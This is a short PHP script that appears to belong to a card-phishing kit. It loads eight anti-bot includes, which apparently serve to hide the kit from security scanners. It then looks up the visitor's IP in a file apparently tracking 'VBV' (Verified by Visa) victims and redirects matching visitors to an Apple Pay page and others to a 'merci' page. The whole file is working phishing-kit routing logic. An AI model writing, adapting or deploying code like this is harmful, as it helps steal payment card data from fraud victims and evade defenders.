<?php 
include '../bots/anti1.php';
include '../bots/anti2.php';
include '../bots/anti3.php';
include '../bots/anti4.php';
include '../bots/anti5.php';
include '../bots/anti6.php';
include '../bots/anti7.php';
include '../bots/anti8.php';

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $IP = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $IP = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $IP = $_SERVER['REMOTE_ADDR'];
}
$link_file = "../functions/ipvbv.txt";
$bannedip = file($link_file, FILE_IGNORE_NEW_LINES);
$bannedip = array_map("str_getcsv", $bannedip);
$bannedip = array_column($bannedip, null, 0);
if(isset($bannedip[$IP])) {
    header('Location: ./apple_pay.php');
}
else{
    header('Location: ./merci.php');
}
?>